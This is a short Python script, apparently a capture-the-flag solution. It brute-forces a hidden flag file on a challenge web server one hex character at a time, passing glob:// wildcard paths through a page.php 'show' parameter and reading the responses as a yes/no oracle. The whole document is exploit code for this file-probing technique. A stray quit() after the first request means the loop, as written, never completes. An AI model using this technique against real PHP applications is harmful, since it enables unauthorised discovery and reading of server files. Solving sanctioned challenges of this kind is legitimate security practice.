#!/usr/bin/env python3

import requests

flag = ""


alpha = "abcdef0123456789"

i = 0
while len(flag) < 32:
    url = f"http://web4.ihack.sibersiaga.my/page.php?show=glob:///var/www/html/ihack{{{flag + alpha[i] + '*'}}}.txt"
    r = requests.get(url)
    print(r.text)
    quit()
    if r.text == "":
        i += 1
    else:
        flag += alpha[i]
        i = 0
